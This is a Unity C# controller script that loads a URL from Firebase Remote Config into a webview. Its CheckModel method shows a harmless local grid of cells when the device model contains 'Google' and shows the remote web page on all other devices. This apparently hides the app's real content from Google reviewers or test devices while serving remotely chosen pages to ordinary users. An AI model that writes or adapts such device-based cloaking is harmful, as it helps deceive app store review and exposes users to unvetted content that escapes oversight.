using Sirenix.OdinInspector;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;

public class ApplicationController : MonoBehaviour
{
    [SerializeField]
    private MyFireBaseRemoteConfig remoteConfig;

    [SerializeField]
    private UniWebView webView;

    [SerializeField]
    private CellsCreator cellsCreator;

    public string savedUrl { get; set; }


    public void StartWebView(string url)
    {
        webView.Load(url);
        webView.Show();
    }

#if UNITY_EDITOR

    private async void Start()
    {
        savedUrl = PlayerPrefs.GetString("URL");

        if (string.IsNullOrEmpty(savedUrl))
            await LoadUrl();
        else
            StartWebView(savedUrl);
    }

#endif

    [Button]
    public void ClearPrefs()
    {
        PlayerPrefs.DeleteAll();
    }

    private bool CheckModel()
    {
        Debug.Log(SystemInfo.deviceModel);
        if (SystemInfo.deviceModel.Contains("Google") || SystemInfo.deviceModel.Contains("google"))
            return false;
        else
            return true;
    }

    public async Task LoadUrl()
    {
        var url = await GetUrl();
        var check = CheckModel();

        Debug.Log("Check model:" + check);
        Debug.Log(url);

        if (string.IsNullOrEmpty(url) || !check)
            cellsCreator.SetCells();

        else
        {
            PlayerPrefs.SetString("URL", url);
            webView.Load(url);
            webView.SetShowToolbar(true);
            webView.Show();
        }
            
    }

    private async Task<string> GetUrl()
    {
        await remoteConfig.FetchDataAsync();

        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url_string").StringValue;
    }
}
